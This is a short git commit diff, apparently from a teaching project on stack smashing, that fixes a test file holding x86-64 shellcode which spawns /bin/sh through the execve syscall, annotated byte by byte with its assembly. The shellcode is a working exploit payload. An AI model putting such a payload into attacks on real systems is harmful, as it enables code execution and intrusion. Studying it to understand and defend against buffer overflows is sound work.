9d9c0a246fb2fbb65a985bb50074b89007bd5a04
Patricia Aas <psmaas@gmail.com>
2018-09-11 09:59:18 +0200

    Fix shellcode test

--- smashing/test_shellcode.c
+++ smashing/test_shellcode.c
@@ -1,13 +1,14 @@
 char shellcode[] =
-    "\xe9\x17\xfa\xff\xff" // jmpq   0x1a
+    "\xeb\x17"             // jmp    617 <push_string>
     "\x5f"                 // pop    %rdi
-    "\x31\xd2"             // xor    %edx,%edx
+    "\x48\x31\xd2"         // xor    %rdx,%rdx
+    "\x48\x31\xc0"         // xor    %rax,%rax
     "\x48\x89\xe6"         // mov    %rsp,%rsi
-    "\x89\x54\x24\x08"     // mov    %edx,0x8(%rsp)
+    "\x48\x89\x54\x24\x08" // mov    %rdx,0x8(%rsp)
     "\x48\x89\x3c\x24"     // mov    %rdi,(%rsp)
     "\xb0\x3b"             // mov    $0x3b,%al
     "\x0f\x05"             // syscall
-    "\xe8\xc7\xf9\xff\xff" // callq  -0x1f
+    "\xe8\xe4\xff\xff\xff" // callq  600 <pop_string>
     "/bin/sh";
 
 int main(void) {
